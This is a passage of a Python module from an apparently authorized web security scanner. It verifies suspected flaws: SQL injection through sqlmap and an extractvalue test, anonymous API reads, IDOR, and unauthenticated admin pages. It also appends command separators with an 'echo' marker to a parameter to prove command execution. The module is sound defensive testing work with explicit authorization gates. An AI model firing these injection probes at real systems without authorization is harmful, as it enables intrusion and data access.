            so.detail = (f"对应检查项（{item_id_for_state}）已执行并判「通过」，"
                         "未发现可深入的可利用入口")
        else:
            so.result = INCONCLUSIVE
            so.skipped = (f"对应检查项（{item_id_for_state or '—'}）状态："
                          f"{st or '未执行'}，未能确认是否存在入口")
        return so

    return AttackStep(step_id=step_id, name=name, objective=objective,
                      kind="detect", impact=impact,
                      requires=requires or [], run=_run)


def _proof_step(step_id: str, name: str, objective: str, prefixes: tuple[str, ...],
                prover: Callable, impact: str = IMPACT_L2,
                requires: list[str] | None = None,
                item_id_for_state: str = "") -> AttackStep:
    """把「发现 → 证明」封装成一步。"""

    def _run(ctx: Any) -> StepOutcome:
        so = StepOutcome()
        fs = _findings_for(ctx, prefixes)
        if not fs:
            st = _item_state(ctx, item_id_for_state) if item_id_for_state else ""
            if st == _STATE_OK:
                # 检查项确实跑过且判通过 → 这是明确的失败证据
                so.result = NOT_PROVEN
                so.detail = (f"对应检查项（{item_id_for_state}）已执行并判「通过」，"
                             "未发现可利用入口")
            else:
                so.result = INCONCLUSIVE
                so.skipped = (f"缺少可证明的入口（检查项状态：{st or '未执行'}），"
                              "本条路径未能验证")
            return so

        agg: list[ProofOutcome] = []
        for f in fs[:4]:
            try:
                agg.append(prover(ctx, f))
            except Exception as e:  # noqa: BLE001
                p = ProofOutcome(inconclusive=True)
                p.reason = f"证明器异常：{type(e).__name__}: {str(e)[:100]}"
                agg.append(p)
        so.probes = sum(p.probes for p in agg)

        won = [p for p in agg if p.proven]
        if won:
            so.result = PROVEN
            so.detail = won[0].detail
            for p in won[:2]:
                so.evidence.extend(p.evidence[:4])
            return so
        if all(p.inconclusive for p in agg):
            so.result = INCONCLUSIVE
            so.skipped = agg[0].reason if agg else "全部证明均未能得出结论"
            return so
        so.result = NOT_PROVEN
        so.detail = agg[0].reason if agg else "证明未通过"
        return so

    return AttackStep(step_id=step_id, name=name, objective=objective,
                      kind="prove", impact=impact,
                      requires=requires or [], run=_run)


# ---- 拿到数据：四条路径 ----

register_path(AttackPath(
    path_id="READ-01", objective=OBJ_READ_DATA, name="注入类读取数据",
    rationale="注入点命中后，真正的问题不是「能否触发报错」，而是「能否读出数据」。",
    steps=[
        _lead_step("READ-01-s1", "发现注入线索", OBJ_READ_DATA,
                   _PAT_SQL, item_id_for_state="WSTG-INPV-05"),
        _proof_step("READ-01-s2", "证明可读出服务端数据", OBJ_READ_DATA,
                    _PAT_SQL, prove_sql_data_reachable,
                    impact=IMPACT_L2, item_id_for_state="WSTG-INPV-05"),
    ],
))

register_path(AttackPath(
    path_id="READ-02", objective=OBJ_READ_DATA, name="未授权接口读取数据",
    rationale="接口返回 200 不等于拿到数据 —— 必须证明响应里真的有业务字段。",
    steps=[
        _lead_step("READ-02-s1", "发现未授权接口", OBJ_READ_DATA,
                   _PAT_UNAUTH, item_id_for_state="WSTG-ATHZ-02"),
        _proof_step("READ-02-s2", "证明匿名可取回业务数据", OBJ_READ_DATA,
                    _PAT_UNAUTH, prove_unauth_data,
                    impact=IMPACT_L1, item_id_for_state="WSTG-ATHZ-02"),
    ],
))

register_path(AttackPath(
    path_id="READ-03", objective=OBJ_READ_DATA, name="文件暴露读取数据",
    rationale="路径返回 200 可能是兜底页 —— 必须验证内容具备数据形态。",
    steps=[
        _lead_step("READ-03-s1", "发现可访问文件", OBJ_READ_DATA, _PAT_FILE),
        _proof_step("READ-03-s2", "证明文件内容确为数据", OBJ_READ_DATA,
                    _PAT_FILE, prove_file_is_data, impact=IMPACT_L1),
    ],
))

register_path(AttackPath(
    path_id="READ-04", objective=OBJ_READ_DATA, name="越权读取他人数据",
    rationale="同端点两个账号返回不同数据，才是越权的证据。",
    steps=[
        _lead_step("READ-04-s1", "发现越权入口", OBJ_READ_DATA, _PAT_IDOR,
                   item_id_for_state="WSTG-ATHZ-04", requires=["accounts"]),
        _proof_step("READ-04-s2", "证明读到的是他人数据", OBJ_READ_DATA,
                    _PAT_IDOR, prove_idor_reads_others,
                    impact=IMPACT_L2, requires=["accounts"],
                    item_id_for_state="WSTG-ATHZ-04"),
    ],
))

register_path(AttackPath(
    path_id="READ-05", objective=OBJ_READ_DATA, name="暴露的敏感数据可直接读取",
    rationale=("发现说「响应里明文暴露了敏感数据」，就要拿同一套 PII 规则"
               "去匿名重取复核 —— 而不是去问「响应是不是 JSON」。"
               "判据用错会造成结论与证据自相矛盾。"),
    steps=[
        _lead_step("READ-05-s1", "发现明文暴露的敏感数据", OBJ_READ_DATA,
                   _PAT_PII),
        _proof_step("READ-05-s2", "证明匿名可读到该敏感数据", OBJ_READ_DATA,
                    _PAT_PII, prove_pii_in_response, impact=IMPACT_L1),
    ],
))


# ======================================================================
# 证明器 6：管理功能未授权可达 → 拿到控制权
# ======================================================================

# 管理功能的**实质内容**特征。判据必须落在「只有管理界面才有的东西」上：
# 用户 / 角色 / 权限 / 系统设置 / 操作日志。
# 不用「admin」「后台」这类词 —— 它们在标题里出现太容易了，
# 一个静态的介绍页写上「管理系统」四个字就会被算成控制权。
_ADMIN_FEATURE = re.compile(
    r"(?i)(用户管理|角色管理|权限管理|系统设置|系统管理|日志管理|数据字典|"
    r"操作日志|配置管理|菜单管理|部门管理|系统监控|数据备份|参数配置|管理员列表|"
    r"user(?:s)?\s*(?:list|management)|role(?:s)?\s*(?:list|management)|"
    r"permission\s*(?:list|management))")

# 有口令输入框 = 这是登录入口，不是管理功能。
# 一个登录页能打开是**正常**的，把它算成「拿到控制权」是本类最大的误报来源。
_PASSWORD_FIELD = re.compile(r"(?i)<input[^>]+type\s*=\s*[\"']?password")

# 管理语义路径（用于从已枚举 URL 里挑候选）
_ADMIN_SEMANTIC = re.compile(
    r"(?i)/(admin|manage|manager|console|dashboard|backend|system|ops|"
    r"controlpanel|actuator|grafana|kibana|jenkins|gitlab|zabbix|监控|后台)")


def _control_url(base: str) -> str:
    """对照请求地址：一个**必然不存在**的随机路径。

    SPA 与兜底路由下「任何路径都返回同一个页面」非常常见。
    没有这个对照，一个兜底页就会把整批管理端点判成「可无凭据访问」——
    这是本项目红线里「孤立信号不得当正面证据」的一个具体落点。
    """
    from urllib.parse import urljoin

    return urljoin(base.rstrip("/") + "/", f"_aiscan_ctl_{secrets.token_hex(6)}")


def _admin_candidates(ctx: Any, finding: Any = None, limit: int = 8) -> list[str]:
    """枚举待探测的管理端点。

    finding 自带的端点排第一 —— 它是检测器**实测命中**过的，
    比字典猜出来的路径可信得多，先打它命中率最高。
    """
    from urllib.parse import urljoin

    from engine.checks.base import ADMIN_PATHS

    out: list[str] = []
    ep = str(getattr(finding, "endpoint", "") or "")
    if ep.startswith("http"):
        out.append(ep)
    for u in (getattr(ctx, "_cache", {}) or {}).get("url_pool_coverage") or []:
        if isinstance(u, str) and _ADMIN_SEMANTIC.search(u):
            out.append(u)
    base = str(getattr(ctx, "target_url", "") or "")
    if base:
        for p in ADMIN_PATHS:
            out.append(urljoin(base.rstrip("/") + "/", p))

    seen: set[str] = set()
    uniq: list[str] = []
    for u in out:
        k = u.rstrip("/").split("?")[0]
        if k in seen:
            continue
        seen.add(k)
        uniq.append(u)
    return uniq[:limit]


@register_prover(_PAT_ADMIN, OBJ_TAKE_CONTROL, IMPACT_L1)
def prove_admin_reachable(ctx: Any, finding: Any = None) -> ProofOutcome:
    """证明「管理功能可无凭据访问」—— 「拿到控制权」的最小充分证据。

    三条判据必须**同时**成立，缺一条只能判「未能验证」：

      ① 匿名（不带任何账号凭据）请求管理端点返回 200；
      ② 响应里是**管理功能的实质内容**（用户 / 角色 / 权限 / 系统设置 /
         操作日志），而不是口令表单 —— 登录页能打开是正常的；
      ③ 与随机路径的对照响应**可区分**（整站同码兜底页不算）。
    """
    out = ProofOutcome(objective=OBJ_TAKE_CONTROL, impact_level=IMPACT_L1)
    if ctx is None:
        out.inconclusive = True
        out.reason = "缺少执行上下文"
        return out

    cands = _admin_candidates(ctx, finding)
    if not cands:
        out.inconclusive = True
        out.reason = "未能定位可探测的管理端点（未枚举到管理语义路径）"
        return out

    base = str(getattr(ctx, "target_url", "") or "")
    ctrl_body = ""
    try:
        ctrl_body = getattr(ctx.get(_control_url(base)), "body_snippet", "") or ""
        out.probes += 1
    except Exception:  # noqa: BLE001
        ctrl_body = ""

    reasons: list[str] = []
    for url in cands:
        try:
            r = ctx.get(url)
        except Exception as e:  # noqa: BLE001
            reasons.append(f"{url}：请求异常（{type(e).__name__}）")
            continue
        out.probes += 1
        st = int(getattr(r, "status", 0) or 0)
        body = getattr(r, "body_snippet", "") or ""
        if st != 200 or not body:
            reasons.append(f"{url}：HTTP {st or '无响应'}")
            continue
        if ctrl_body and body.strip() == ctrl_body.strip():
            reasons.append(f"{url}：与随机路径返回同一页面（兜底页 / 整站同码），"
                           "无法区分")
            continue
        if _PASSWORD_FIELD.search(body):
            reasons.append(f"{url}：是口令表单页（登录入口可访问属正常，不是控制权）")
            continue
        hit = _ADMIN_FEATURE.search(body)
        if not hit:
            reasons.append(f"{url}：响应不含管理功能特征")
            continue
        out.proven = True
        out.detail = (f"无凭据访问管理端点成功，且响应含管理功能内容"
                      f"（命中「{hit.group(0)}」）")
        out.evidence = [
            f"端点：{url}",
            "请求方式：匿名（未带任何账号凭据）",
            f"HTTP {st}，响应长度 {len(body)} 字节",
            f"管理功能特征命中：{hit.group(0)}",
            "对照：随机路径返回内容与之不同（已排除兜底页 / 整站同码）",
            f"响应片段（已截断）：{body[:300]}",
        ]
        return out

    out.inconclusive = True
    out.reason = ("已探测管理端点但均未取得「真实管理功能」证据："
                  + "；".join(reasons[:4]))
    return out


# ======================================================================
# 证明器 7：命令执行 → 拿到控制权
# ======================================================================

_EXEC_MARK = "aiscanexec"
# 只允许这一种载荷形态：分隔符 + 无害回显。
# 之所以限制得这么死 —— 它会**真的在目标服务器上执行命令**。
# echo 不写文件、不改配置、不联网，是本模块唯一允许的主动执行动作。
_EXEC_SEPARATORS = (";", "|", "&&", "\n")


def _inject_probe(ctx: Any, url: str, param: str, value: str) -> str | None:
    """把 value 作为 param 的值重新请求，返回响应体。失败返回 None。"""
    from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

    parts = urlsplit(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    new = urlunsplit((parts.scheme, parts.netloc, parts.path,
                      urlencode(q), parts.fragment))
    try:
        r = ctx.get(new)
    except Exception:  # noqa: BLE001
        return None
    return getattr(r, "body_snippet", "") or ""


@register_prover(_PAT_EXEC, OBJ_TAKE_CONTROL, IMPACT_L1, requires=["write"])
def prove_command_execution(ctx: Any, finding: Any = None) -> ProofOutcome:
    """证明「提交的字符串确实被当成命令执行了」。

    判据（三条同时成立）：

      ① 提交 `; echo <随机标记>` 后响应里出现该标记；
      ② 基线请求（原样，不带载荷）**不含**该标记 —— 排除本来就有；
      ③ 响应里**不含完整载荷原文**（即不含 `echo <标记>` 那一段）——
         服务端若只是把参数原样回显，回显里必然带上这段原文。
         只看到标记、看不到载荷原文，才说明拿到的是**命令输出**。

    第 ③ 条是本类最容易漏掉的防线：把「响应里出现了标记」直接判成
    命令执行，而目标其实只是反射参数 —— 多个公开扫描器都栽在这里。

    另有二次确认：换一个标记重放一次，必须只有新标记出现 ——
    防的是「服务端把两次响应的内容混在一起」这类缓存 / 拼页行为。
    """
    out = ProofOutcome(objective=OBJ_TAKE_CONTROL, impact_level=IMPACT_L1)
    ep = str(getattr(finding, "endpoint", "") or "")
    pname = str(getattr(finding, "param", "") or "")
    if not ep.startswith("http") or not pname:
        out.inconclusive = True
        out.reason = "该发现未记录可注入的端点与参数，无法构造验证请求"
        return out

    try:
        base_body = getattr(ctx.get(ep), "body_snippet", "") or ""
    except Exception as e:  # noqa: BLE001
        out.inconclusive = True
        out.reason = f"基线请求失败：{type(e).__name__}"
        return out
    out.probes += 1

    m1 = f"{_EXEC_MARK}{secrets.randbelow(900000) + 100000}"
    m2 = f"{_EXEC_MARK}{secrets.randbelow(900000) + 100000}"
    tried: list[str] = []

    for sep in _EXEC_SEPARATORS:
        payload = f"{sep}echo {m1}"
        body = _inject_probe(ctx, ep, pname, payload)
        out.probes += 1
        if body is None:
            continue
        tried.append(sep if sep != "\n" else "\\n")
        if m1 not in body or m1 in base_body:
            continue
        # ③ 回显防线
        if f"echo {m1}" in body or f"echo {m1}" in body.replace("  ", " "):
            out.inconclusive = True
            out.reason = ("响应里出现了完整载荷原文（含 echo 段），"
                          "说明该参数被原样回显而不是命令输出 —— 无法区分，"
                          "不下结论")
            return out
        # 二次确认
        body2 = _inject_probe(ctx, ep, pname, f"{sep}echo {m2}")
        out.probes += 1
        if body2 is None or m2 not in body2 or m1 in body2:
            out.inconclusive = True
            out.reason = ("二次确认未通过（换标记后响应不符合预期），"
                          "不判已达成")
            return out
        out.proven = True
        out.detail = (f"参数 `{pname}` 处提交的命令被服务端执行，"
                      f"取回了无害命令的输出（标记 {m1}）")
        out.evidence = [
            f"端点：{ep}",
            f"受影响参数：{pname}",
            f"提交形态：分隔符 `{sep if sep != chr(10) else '换行'}` + 无害回显命令",
            f"命令输出标记：{m1}（基线响应中不存在）",
            f"二次确认：换标记后仅新标记出现（{m2}）",
            "排除项：响应中不含完整载荷原文，确认是命令输出而非参数回显",
            "安全边界：只执行一次无害回显，不写文件、不改配置、不联网",
        ]
        return out

    out.inconclusive = True
    out.reason = (f"已尝试分隔符 {'/'.join(tried) or '（无）'}，"
                  "未取得命令被执行的确凿证据 —— 这是「没打通」，不是「不存在」")
    return out


# ======================================================================
# 证明器 8：服务端采纳客户端提交的业务数据 → 修改数据
# ======================================================================

_WRITE_KIND_CN = {
    "AMOUNT": "金额", "QUANTITY": "数量", "DISCOUNT": "优惠 / 折扣",
    "STATE": "状态", "ROLE": "角色 / 权限", "IDENTITY": "归属标识",
    "TIME": "时间", "SIGN": "签名", "OTHER": "业务",
}


def _write_proven_records(ctx: Any) -> list[Any]:
    """取 P4 侦察阶段实测确证的写差分记录。

    读的是 `engine/business.py` 缓存的差分实验结论 —— 证明层**不重跑**写操作：
    重跑等于把同一个副作用做两遍，而写操作全局只有 6 次预算。
    """
    data = (getattr(ctx, "_cache", {}) or {}).get("business_diffs")
    if not data:
        return []
    try:
        recs = list(data[0] or [])
    except Exception:  # noqa: BLE001
        return []
    return [r for r in recs if str(getattr(r, "verdict", "")) == "PROVEN"]


@register_prover(_PAT_WRITE, OBJ_MODIFY_DATA, IMPACT_L2, requires=["write"])
def prove_write_persisted(ctx: Any, finding: Any = None) -> ProofOutcome:
    """证明「客户端提交的业务数据真的被服务端采纳了」。

    这是「修改数据」的底线判据。**「提交成功」不是证据**，
    「响应里回显了提交的值」也不是 —— 只看到回显就报「可以改数据」，
    是本类最典型的误报，研发一句「服务端会重算」就能否掉整份报告。

    实测判据（P4 侦察阶段已完成，本处只消费结论，不重复发写请求）：

        把 A 字段从原值改成非法值后，**同响应里的另一个业务字段 B
        也跟着变成了非法值** —— 说明服务端拿客户端提交的值
        参与了业务计算，而不是把它当字符串回显。

    这条证据支持「服务端采纳了客户端数据」这个结论，
    但**不等于**「该值已持久化到数据库」。两者强度不同，detail 里写清是哪一级，
    报告不得把前者表述成后者。
    """
    out = ProofOutcome(objective=OBJ_MODIFY_DATA, impact_level=IMPACT_L2)
    recs = _write_proven_records(ctx)
    if not recs:
        out.inconclusive = True
        out.reason = ("本次未取得「服务端采纳客户端业务字段」的实测证据"
                      "（写差分未执行或未确证）—— 这是「没测」，"
                      "不是「改不动」")
        return out

    best = recs[0]
    param = str(getattr(best, "param", "") or "")
    kind = _WRITE_KIND_CN.get(str(getattr(best, "kind", "")), "业务")
    changed = [str(x) for x in (getattr(best, "changed_fields", None) or [])]
    derived = [str(x) for x in (getattr(best, "derived_fields", None) or [])]
    endpoint = str(getattr(best, "endpoint", "") or "")
    method = str(getattr(best, "method", "") or "POST")

    out.proven = True
    out.detail = (
        f"服务端采纳了客户端提交的{kind}字段 `{param}`："
        f"把它从 {getattr(best, 'original', '?')} 改为 "
        f"{getattr(best, 'tampered', '?')} 后，"
        f"响应中另一个业务字段（{'、'.join((changed or derived)[:3]) or '同对象字段'}）"
        f"随之变化 —— 说明该值参与了服务端业务计算，而不是被原样回显。")
    out.evidence = [
        f"端点：{method} {endpoint}",
        f"受影响字段：{param}（{kind}）",
        f"基线值 {getattr(best, 'original', '?')} → 提交值 "
        f"{getattr(best, 'tampered', '?')}",
        f"对照证据：同响应中 {'、'.join((changed or derived)[:3]) or '其它业务字段'}"
        f"随之变化（仅回显不会引起这种联动）",
        "证据强度：已证明「服务端采纳客户端数据」；"
        "「已持久化」需独立回读，本次未取得该级证据",
    ]
    return out


# ---- 拿到控制权：两条路径 ----

register_path(AttackPath(
    path_id="TC-01", objective=OBJ_TAKE_CONTROL, name="管理功能未授权访问",
    rationale=("管理端点可访问 ≠ 拿到控制权。登录页能打开是正常的；"
               "必须证明响应里是**真实管理功能**而不是口令表单，"
               "否则整类结论都是在把登录页当战果。"),
    steps=[
        _lead_step("TC-01-s1", "发现认证绕过 / 管理面线索", OBJ_TAKE_CONTROL,
                   _PAT_ADMIN, item_id_for_state="WSTG-CONF-05"),
        _proof_step("TC-01-s2", "证明管理功能可无凭据访问", OBJ_TAKE_CONTROL,
                    _PAT_ADMIN, prove_admin_reachable,
                    impact=IMPACT_L1, item_id_for_state="WSTG-CONF-05"),
    ],
))

register_path(AttackPath(
    path_id="TC-02", objective=OBJ_TAKE_CONTROL, name="命令执行",
    rationale=("命令注入的终点不该是「能触发报错」，而是「命令真的被执行了」。"
               "但「响应里出现标记」还不够 —— 目标可能只是反射参数，"
               "必须同时确认响应里没有完整载荷原文。"),
    steps=[
        _lead_step("TC-02-s1", "发现可执行面线索", OBJ_TAKE_CONTROL,
                   _PAT_EXEC, item_id_for_state="WSTG-INPV-12"),
        _proof_step("TC-02-s2", "证明命令确实被执行", OBJ_TAKE_CONTROL,
                    _PAT_EXEC, prove_command_execution,
                    impact=IMPACT_L1, requires=["write"],
                    item_id_for_state="WSTG-INPV-12"),
    ],
))

# ---- 修改数据：一条路径 ----

register_path(AttackPath(
    path_id="MOD-01", objective=OBJ_MODIFY_DATA,
    name="服务端采纳客户端提交的业务数据",
    rationale=("「能改数据」的底线证据不是「提交成功」，而是"
               "「服务端拿提交的值参与了业务计算」——只看回显就报"
               "「可以改数据」，是本类最典型的误报。"),
    steps=[
        _lead_step("MOD-01-s1", "发现可写业务参数线索", OBJ_MODIFY_DATA,
                   _PAT_WRITE, item_id_for_state="WSTG-BUSL-03"),
        _proof_step("MOD-01-s2", "证明提交的字段被服务端采纳", OBJ_MODIFY_DATA,
                    _PAT_WRITE, prove_write_persisted,
                    impact=IMPACT_L2, requires=["write"],
                    item_id_for_state="WSTG-BUSL-03"),
    ],
))


# ======================================================================
# 门面：对一批发现跑结果证明
# ======================================================================


class ProofRunner:
    """对「已确认的发现」补充结果证明，把结论写回 finding.extra["proof"]。"""

    def __init__(self, ctx: Any, impact_level: str = IMPACT_L2):
        self.ctx = ctx
        self.impact_level = impact_level
        self.ran = 0
        self.proven = 0
        self.inconclusive = 0

    def run(self, findings: list[Any]) -> list[Any]:
        from engine.redteam import IMPACT_ORDER

        for f in findings:
            hit = find_prover(f)
            if hit is None:
                continue
            obj, impact, requires, fn = hit
            if IMPACT_ORDER.get(impact, 0) > IMPACT_ORDER.get(self.impact_level, 1):
                f.extra["proof"] = {
                    "state": INCONCLUSIVE,
                    "reason": f"影响级别 {impact} 超出本次授权上限 {self.impact_level}",
                }
                self.inconclusive += 1
                continue
            if "accounts" in requires and not getattr(self.ctx, "accounts", None):
                f.extra["proof"] = {
                    "state": INCONCLUSIVE,
                    "reason": "需要多账号配置（--accounts），本次未提供",
                }
                self.inconclusive += 1
                continue
            if "write" in requires and not getattr(self.ctx, "allow_write", False):
                f.extra["proof"] = {
                    "state": INCONCLUSIVE,
                    "reason": ("该证明需要写操作授权（ledger --allow-write），"
                               "本次未开启 —— 这是「没测」，不是「打不穿」"),
                }
                self.inconclusive += 1
                continue

            self.ran += 1
            try:
                out = fn(self.ctx, f)
            except Exception as e:  # noqa: BLE001
                out = ProofOutcome(inconclusive=True)
                out.reason = f"证明器异常：{type(e).__name__}: {str(e)[:100]}"

            f.extra["proof"] = out.to_dict()
            if out.proven:
                self.proven += 1
                # 结果证明成功 → 证据等级升为 A（实测影响），影响字段改为
                # 「实测拿到了什么」，而不是「可能拿到什么」
                f.extra["proof_summary"] = out.detail
                if f.evidence_level != "A":
                    f.evidence_level = "A"
                f.impact = (f"{f.impact}\n\n【实测验证】{out.detail}").strip()
            elif out.inconclusive:
                self.inconclusive += 1
        return findings

    def summary(self) -> dict[str, Any]:
        # 三态都要报，尤其不能漏「未达成」—— 只报「已达成 / 未能验证」时，
        # 「试过了没打通」的那些条目会从阶段摘要里消失，读者会以为
        # 这批发现要么被证明了、要么没测，中间那一档被静默吞掉。
        return {"proved": self.proven, "inconclusive": self.inconclusive,
                "not_proven": max(0, self.ran - self.proven - self.inconclusive),
                "ran": self.ran}


# ======================================================================
# 自测
# ======================================================================


def _selftest() -> int:
    problems: list[str] = []

    # 离线自测**绝不**允许真的拉起 sqlmap（那会向外部地址发请求）。
    # 需要走 sqlmap 分支的用例自己注入假执行体（ctx.sqlmap_runner），
    # 并在用完后恢复。
    _prev_sqlmap_env = os.environ.get("AISCAN_SQLMAP")
    os.environ["AISCAN_SQLMAP"] = "off"

    class _FakeFinding:
        def __init__(self, item_id, endpoint="", param="", detail=""):
            self.item_id = item_id
            self.endpoint = endpoint
            self.param = param
            self.extra: dict = {}
            self.evidence_level = "B"
            self.impact = "可能拿到数据"
            self.description = ""
            self.technical_detail = detail
            self.evidence: list = []

    class _FakeCtx:
        def __init__(self, responses):
            self.target_url = "https://t.test"
            self.accounts: list = []
            self.allow_write = False
            self._cache: dict = {}
            self._responses = responses
            self.calls: list[str] = []

        def raw_request(self, method, url, **kw):
            self.calls.append(url)
            for key, resp in self._responses.items():
                if key in url:
                    # 支持可调用值：有些判据依赖**随机**标记（命令执行的验证
                    # 必须用一个攻击者事先不知道、服务端也不该知道的标记），
                    # 固定响应对根本写不出来。
                    return resp(url) if callable(resp) else resp
            return {"status": 200, "body": "<html>empty page fallback</html>"}

        def get(self, url, method="GET", **kw):
            """与生产 DetectorContext.get 同形（返回带 status/body_snippet 的对象）。

            自测必须能打桩那些走 `ctx.get` 的证明器，否则它们在生产路径上跑的
            判据在自测里根本没有被验证过 —— 那是「自测跑得再绿也不能证明
            生产能跑通」的另一种形态。
            """
            from types import SimpleNamespace  # noqa: PLC0415

            p = self.raw_request(method, url)
            return SimpleNamespace(status=p.get("status", 0),
                                   headers=p.get("headers", {}),
                                   body_snippet=p.get("body", ""),
                                   final_url=url)

        def data_submit(self, url, payload, **kw):
            self.calls.append(url)
            return {"status": 200, "body": "{}", "headers": {}}

    # 1) 结构化数据判据不得把页面当数据
    ok, _ = _looks_like_structured_data("<html><body>404 Not Found</body></html>")
    if ok:
        problems.append("HTML 页面不得被判为数据")
    ok2, why2 = _looks_like_structured_data(
        json.dumps([{"id": 1, "phone": "13800000000"} for _ in range(3)]))
    if not ok2:
        problems.append(f"JSON 数组应判为数据，实际 {why2}")

    # 2) SQL 证明：回显命中 → 已达成
    ctx = _FakeCtx({
        "extractvalue": {"status": 200,
                         "body": "error: XPATH syntax error: '~8.0.32-log'"},
    })
    out = prove_sql_data_reachable(
        ctx, _FakeFinding("WSTG-INPV-05", "https://t.test/a?q=1", "q"))
    if not out.proven:
        problems.append(f"报错回显应证明数据可达，实际 {out.state}（{out.reason}）")

    # 3) SQL 证明：报错型无回显 → 只能判「未能验证」，不得判「未达成」
    #    （盲注等手法未覆盖，「这种手法没成功」≠「数据不可达」）
    ctx2 = _FakeCtx({"q=1": {"status": 200, "body": "<html>normal page</html>"}})
    out2 = prove_sql_data_reachable(
        ctx2, _FakeFinding("WSTG-INPV-05", "https://t.test/a?q=1", "q"))
    if out2.proven or not out2.inconclusive:
        problems.append("报错型无回显时应判「未能验证」，"
                        "不得判已达成或未达成（盲注手法未覆盖）")
    # 3b) 工具被关闭时，理由里必须写明「未执行 / 没测」——
    #     把工具缺失写成「未达成」，读者会理解成「试过打不通」，是两回事。
    if "sqlmap" in out2.reason and "未执行" not in out2.reason:
        problems.append(f"sqlmap 未执行时理由没说清「没测」：{out2.reason}")

    # 3c) sqlmap 补证成功 → 已达成（这一步原来只能交人工）
    _inj_out = ("[INFO] testing connection\n"
                "sqlmap identified the following injection point(s)\n"
                "Parameter: q (GET)\n"
                "    Type: boolean-based blind\n"
                "back-end DBMS: MySQL >= 5.0\n"
                "banner: '8.0.32-log'\n")
    ctx2b = _FakeCtx({"q=1": {"status": 200, "body": "<html>normal page</html>"}})
    ctx2b.sqlmap_runner = lambda argv: _inj_out
    os.environ["AISCAN_SQLMAP"] = "on"
    out2b = prove_sql_data_reachable(
        ctx2b, _FakeFinding("WSTG-INPV-05", "https://t.test/a?q=1", "q"))
    os.environ["AISCAN_SQLMAP"] = "off"
    if not out2b.proven:
        problems.append(f"sqlmap 确证注入时应判已达成，实际 {out2b.state}"
                        f"（{out2b.reason}）")
    elif "sqlmap" not in out2b.detail:
        problems.append("sqlmap 证明成功的结论里未说明证据来源")
    # 证据里绝不能出现 dump 类数据内容（本模块只读元信息）
    if any("INSERT INTO" in str(e) for e in (out2b.evidence or [])):
        problems.append("sqlmap 证明的证据里出现了数据导出内容（越界）")

    # 3d) sqlmap 跑完但未确证 → 未能验证（不得判「未达成」）
    ctx2c = _FakeCtx({"q=1": {"status": 200, "body": "<html>normal page</html>"}})
    ctx2c.sqlmap_runner = lambda argv: "all tested parameters do not appear to be injectable"
    os.environ["AISCAN_SQLMAP"] = "on"
    out2c = prove_sql_data_reachable(
        ctx2c, _FakeFinding("WSTG-INPV-05", "https://t.test/a?q=1", "q"))
    os.environ["AISCAN_SQLMAP"] = "off"
    if out2c.proven or not out2c.inconclusive:
        problems.append("sqlmap 未确证注入时应判未能验证，不得判未达成")

    # 4) 未授权接口：返回 200 但无业务字段 → 不得判已达成
    ctx3 = _FakeCtx({"api/x": {"status": 200, "body": "<html>welcome page</html>"}})
    out3 = prove_unauth_data(ctx3, _FakeFinding("WSTG-ATHZ-02", "https://t.test/api/x"))
    if out3.proven:
        problems.append("HTML 欢迎页不得被判为「匿名取回业务数据」")

    # 5) 未授权接口：真数据 → 已达成
    ctx4 = _FakeCtx({"api/orders": {
        "status": 200,
        "body": json.dumps([{"orderId": "A1", "phone": "13800000000",
                             "amount": 99.5} for _ in range(4)])}})
    out4 = prove_unauth_data(ctx4, _FakeFinding("WSTG-ATHZ-02",
                                                "https://t.test/api/orders"))
    if not out4.proven:
        problems.append(f"真实业务数据应判已达成，实际 {out4.state}（{out4.reason}）")

    # 6) 整站同码：端点与随机路径同内容 → 未能验证（不得判已达成）
    same = json.dumps([{"id": i} for i in range(6)])
    ctx5 = _FakeCtx({"api/data": {"status": 200, "body": same},
                     "_aiscan_": {"status": 200, "body": same}})
    out5 = prove_unauth_data(ctx5, _FakeFinding("WSTG-ATHZ-02", "https://t.test/api/data"))
    if out5.proven or not out5.inconclusive:
        problems.append("端点与随机路径同内容时不得判已达成")

    # 7) 越权：单账号 → 未能验证
    ctx6 = _FakeCtx({})
    ctx6.accounts = [{"name": "A", "headers": {}, "cookies": {}}]
    out6 = prove_idor_reads_others(
        ctx6, _FakeFinding("WSTG-ATHZ-04", "https://t.test/api/x"))
    if out6.proven or not out6.inconclusive:
        problems.append("仅有单账号时越权证明必须判未能验证")

    # 8) 路径步骤：检查项判通过且无线索 → 未达成（明确失败证据）
    ctx7 = _FakeCtx({})
    ctx7._cache["item_states"] = {"WSTG-INPV-05": _STATE_OK}
    ctx7.findings = []
    step = [s for s in [p for p in _paths() if p.path_id == "READ-01"][0].steps
            if s.step_id == "READ-01-s2"][0]
    so = step.run(ctx7)
    if so.result != NOT_PROVEN:
        problems.append(f"检查项判通过且无线索时应为未达成，实际 {so.result}")

    # 9) 路径步骤：检查项未执行 → 未能验证
    ctx8 = _FakeCtx({})
    ctx8.findings = []
    so2 = step.run(ctx8)
    if so2.result != INCONCLUSIVE:
        problems.append(f"检查项未执行时应为未能验证，实际 {so2.result}")

    # 10) 证明器注册表能按 item_id 命中
    if find_prover(_FakeFinding("WSTG-INPV-05")) is None:
        problems.append("SQL 注入发现未命中证明器")
    if find_prover(_FakeFinding("UNKNOWN-99")) is not None:
        problems.append("未知检查项不应命中证明器")

    # 10b) 最具体匹配 + **项号语义正确**。
    #      IDOR（ATHZ-04）判据与匿名读取（ATHZ-02/03）完全不同，不能被家族模式抢走。
    #      同时项号必须与清单语义一致 —— 曾经把 IDOR 挂在 ATHZ-01 上，
    #      而清单里 ATHZ-01 是「目录遍历与文件包含」，报告项号与检查项对不上号。
    _p_idor = find_prover(_FakeFinding("WSTG-ATHZ-04"))
    _p_unauth = find_prover(_FakeFinding("WSTG-ATHZ-02"))
    if not _p_idor or _p_idor[3] is not prove_idor_reads_others:
        problems.append("WSTG-ATHZ-04（IDOR）未命中越权证明器（被家族模式抢走了）")
    if not _p_unauth or _p_unauth[3] is not prove_unauth_data:
        problems.append("WSTG-ATHZ-02 未命中匿名读取证明器")
    if "WSTG-ATHZ-01" in _PAT_IDOR:
        problems.append(
            "IDOR 证明器不得挂在 WSTG-ATHZ-01 上 —— 该项在清单里是"
            "「目录遍历与文件包含」，挂错会让报告项号与检查项对不上")
    _p_dir = find_prover(_FakeFinding("WSTG-ATHZ-01"))
    if not _p_dir or _p_dir[3] is not prove_file_is_data:
        problems.append(
            "WSTG-ATHZ-01（目录遍历）应按「文件内容是否具备数据形态」判据证明")

